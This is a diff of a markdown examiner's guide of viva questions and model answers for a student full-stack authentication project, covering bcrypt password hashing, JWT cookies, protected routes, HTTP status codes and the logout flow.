-  const fetchUser = async () => {
-    try {
-      const res = await api.get("/customers/me");
-      setProfile(res.data);
-    } catch (err) {
-      // 401 Unauthorized: Not logged in or expired session!
-      navigate("/login");
-    } finally {
-      setLoading(false);
-    }
-  };
-  fetchUser();
-}, [navigate]);
+/login
 ```
 
 ---
 
-# 7. Password Hashing & Backend Security
+# 🔴 Strong Medium Questions
 
-### ❓ Question 11: "Why do we use `bcrypt.hash(password, 10)`? What is the '10'?"
+These are particularly useful for distinguishing students who understand the implementation.
 
-#### 💡 Ideal Student Answer:
-> *"We never save plain text passwords because if the database leaks, all user accounts are compromised. `bcrypt` adds a random salt to the password before hashing it.  
-> The number **10** is the **salt rounds** (work factor). It controls how many computational rounds are run ($2^{10} = 1024$ iterations). This deliberately slows down brute-force and rainbow table attacks."*
+### 31. Why do we hash the password during registration but use `compare()` during login?
 
-#### 💻 Code Snippet:
-```javascript
-// Register:
-const hashedPassword = await bcrypt.hash(password, 10);
-await Customer.create({ ...data, password: hashedPassword });
+**Answer:**
 
-// Login:
-const isMatch = await bcrypt.compare(password, customer.password);
-if (!isMatch) {
-  return res.status(401).json({ message: "Invalid email or password" });
+During registration, the plain password needs to be transformed into a secure stored hash:
+
+```js
+bcrypt.hash(password, 10)
+```
+
+During login, we already have the stored hash, so we use:
+
+```js
+bcrypt.compare(password, hash)
+```
+
+to determine whether the entered password matches it.
+
+---
+
+### 32. Why can't we do this?
+
+```js
+if (password === user.password)
+```
+
+**Answer:**
+
+Because `user.password` should contain a bcrypt hash, not the original password. The plain password and its hash will not be equal. `bcrypt.compare()` is designed for this comparison.
+
+---
+
+### 33. What is inside the JWT?
+
+For example:
+
+```js
+jwt.sign(
+  {
+    userId: user._id
+  },
+  secret
+);
+```
+
+**Answer:**
+
+The payload contains the `userId`. JWTs also contain standard claims/metadata depending on how they are generated. The token is signed so the server can verify its integrity.
+
+---
+
+### 34. Is JWT encrypted?
+
+**Answer:**
+
+Normally, no. A JWT is generally **encoded and signed**, not encrypted. Therefore, sensitive information should not be placed in the payload merely because it is inside a JWT.
+
+---
+
+### 35. What happens if someone modifies the JWT?
+
+**Answer:**
+
+The signature will no longer match the token's contents, so `jwt.verify()` should reject it.
+
+---
+
+### 36. Why should `JWT_SECRET` be stored in `.env`?
+
+**Answer:**
+
+The secret should not be hardcoded in source code or exposed publicly. Environment variables provide a separate configuration mechanism for sensitive secrets.
+
+Example:
+
+```env
+JWT_SECRET=my-super-secret-key
+```
+
+Then:
+
+```js
+process.env.JWT_SECRET
+```
+
+---
+
+### 37. What happens if the email already exists?
+
+**Answer:**
+
+The backend should detect the existing user:
+
+```js
+const existingUser =
+  await User.findOne({ email });
+```
+
+and return an error rather than creating another account with the same email.
+
+---
+
+### 38. Why is email marked `unique: true`?
+
+```js
+email: {
+  type: String,
+  unique: true
 }
 ```
 
----
+**Answer:**
 
-### ❓ Question 12: "Why do we return the same message 'Invalid email or password' whether the email was wrong OR the password was wrong?"
-
-#### 💡 Ideal Student Answer:
-> *"This prevents **User Enumeration Attacks**. If we returned 'Email not found', an attacker could test email lists to discover which users have accounts on our platform. Using a generic message protects user privacy."*
+It creates a uniqueness constraint/index so multiple users should not have the same email. However, the application should still handle duplicate-key errors rather than relying solely on frontend validation.
 
 ---
 
-# 8. Error Handling & Industry Standards
+### 39. What is the difference between authentication and protected routing?
 
-### ❓ Question 13: "What HTTP status codes should you use for authentication endpoints?"
+**Answer:**
 
-| Status Code | Name | When to Use in ShopKart |
-| :--- | :--- | :--- |
-| **`200 OK`** | Success | Successful Login (`/login`) or Profile Fetch (`/me`) |
-| **`201 Created`** | Created | Successful Registration (`/register`) |
-| **`400 Bad Request`** | Client Error | Missing fields, password too short (<6 characters) |
-| **`401 Unauthorized`** | Auth Failed | Invalid credentials, missing or expired cookie token |
-| **`403 Forbidden`** | Forbidden | Valid identity, but lacking permission for this resource |
-| **`409 Conflict`** | Conflict | Email already registered in database |
-| **`500 Internal Error`** | Server Error | Unhandled exceptions, database connection failures |
+Authentication verifies who the user is.
 
----
+Protected routing controls whether the user can access a particular resource/page based on authentication status.
 
-### ❓ Question 14: "How does the Logout flow work step by step?"
+For example:
 
-#### 💡 Ideal Student Answer:
-> *"1. The user clicks **Logout** in `Navbar.jsx`.  
-> 2. Frontend calls `api.post("/customers/logout")`.  
-> 3. The backend executes `res.clearCookie("token")`, instructing the browser to delete the cookie.  
-> 4. Frontend resets its local React state (`setCustomer(null)`).  
-> 5. React Router navigates the user to `/login`."*
+```text
+Login → authentication
 
-```javascript
-// Backend:
-async function logoutCustomer(req, res) {
-  res.clearCookie("token");
-  return res.status(200).json({ success: true, message: "Logged out" });
-}
+/me → protected API
+/home → protected UI
 ```
 
 ---
 
-# 9. ⚡ Rapid-Fire Viva Cheat Sheet (5-Minute Evaluation)
+### 40. Explain the complete protected-page flow.
 
-Use this quick checklist during student assessments:
+A strong student should answer something like:
 
-1. **"What is the difference between `npm run dev` and `npm start` in Vite?"**  
-   *Answer*: Vite's default dev command is `vite` (aliased to `dev`). We added `"start": "vite"` to `package.json` so both commands start the local development server.
-2. **"Can we decode a JWT on `jwt.io` without knowing the secret key?"**  
-   *Answer*: Yes, because the payload is just Base64Url-encoded. But we cannot create a *valid signature* without the secret key.
-3. **"Where is the token stored in this project?"**  
-   *Answer*: In an HttpOnly cookie managed by the browser.
-4. **"What hook do you use to change pages programmatically in React Router v6?"**  
-   *Answer*: `useNavigate()` (`const navigate = useNavigate(); navigate('/home')`).
-5. **"Why is `useEffect` with an empty dependency array `[]` used in `/home`?"**  
-   *Answer*: It ensures the API call to `/customers/me` runs only once when the component first mounts.
-6. **"What does `select('-password')` do in Mongoose?"**  
-   *Answer*: It excludes the hashed password field from the query result so it is never accidentally sent over the network to the client.
-7. **"Why do we need proxy in `vite.config.js` or CORS in Express?"**  
-   *Answer*: To bridge requests across different ports (`5173` to `5001`) without violating browser cross-origin security rules.
-8. **"What will happen if a user manually changes the URL to `/home` while logged out?"**  
-   *Answer*: `/home` executes `GET /customers/me`. Without the cookie, the backend returns 401, and the `catch` block calls `navigate("/login")`.
-9. **"Why is `Customer.findOne({ email })` needed during registration?"**  
-   *Answer*: To ensure email uniqueness and return a clean 409 Conflict instead of a database crash.
-10. **"What does `res.cookie('token', token, { maxAge: 86400000 })` mean?"**  
-    *Answer*: It sets cookie expiration to 24 hours (in milliseconds: $24 \times 60 \times 60 \times 1000$).
+> When the user opens `/home`, React requests `/api/auth/me` with credentials included. The browser sends the authentication cookie. Express reads the token using `req.cookies.token`. The authentication middleware verifies the JWT and extracts the user ID. The server then retrieves that user's information from MongoDB and returns it. React stores the user information and displays the name, email, and phone number.
+
+---
+
+# ⭐ Quick Viva Questions You Can Fire at Students
+
+These are excellent for a practical exam because they can be asked directly while looking at the student's code.
+
+### Q1.
+
+**Why did you write this?**
+
+```js
+credentials: "include"
+```
+
+Expected:
+
+> To include cookies/credentials in the request.
+
+---
+
+### Q2.
+
+**What happens if I remove this?**
+
+```js
+bcrypt.hash(password, 10)
+```
+
+Expected:
+
+> The password could be stored in plain text, which is insecure.
+
+---
+
+### Q3.
+
+**What does this do?**
+
+```js
+const token = req.cookies.token;
+```
+
+Expected:
+
+> It retrieves the JWT authentication token from the browser cookie.
+
+---
+
+### Q4.
+
+**What does this do?**
+
+```js
+req.userId = decoded.userId;
+```
+
+Expected:
+
+> It stores the authenticated user's ID from the verified JWT on the request object so later middleware/route handlers can use it.
+
+---
+
+### Q5.
+
+**Why do we call `next()`?**
+
+Expected:
+
+> To continue the request to the next middleware or route handler.
+
+---
+
+### Q6.
+
+**What happens if I manually open `/home` without logging in?**
+
+Expected:
+
+> The protected API should reject the request because there is no valid authentication cookie, and the frontend should redirect to `/login`.
+
+---
+
+### Q7.
+
+**Why is `password` not displayed on the home page?**
+
+Expected:
+
+> Password information should not be returned to the frontend. We can explicitly exclude it with `.select("-password")`.
+
+---
+
+### Q8.
+
+**Why do we use 401 instead of 404 for invalid login?**
+
+Expected:
+
+> Because the problem is authentication failure, not that the requested resource doesn't exist.
+
+---
+
+### Q9.
+
+**What is the difference between `jwt.sign()` and `jwt.verify()`?**
+
+Expected:
+
+```text
+jwt.sign()
+→ creates a signed token
+
+jwt.verify()
+→ validates the token and extracts its payload
+```
+
+---
+
+### Q10.
+
+**Explain registration → login → home → logout without looking at your code.**
+
+A student who genuinely understands the project should be able to explain:
+
+```text
+REGISTER
+   ↓
+POST /register
+   ↓
+Validate
+   ↓
+Hash password
+   ↓
+Save MongoDB
+   ↓
+Redirect /login
+
+LOGIN
+   ↓
+POST /login
+   ↓
+Find user
+   ↓
+bcrypt.compare()
+   ↓
+JWT
+   ↓
+Cookie
+   ↓
+/home
+
+HOME
+   ↓
+GET /me
+   ↓
+Cookie
+   ↓
+JWT verify
+   ↓
+User data
+   ↓
+Display user
+
+LOGOUT
+   ↓
+POST /logout
+   ↓
+Clear cookie
+   ↓
+/login
+```
+
+That final question is probably the **single most useful viva question** for this assignment because it tests whether the student understands the entire authentication architecture rather than individual syntax.
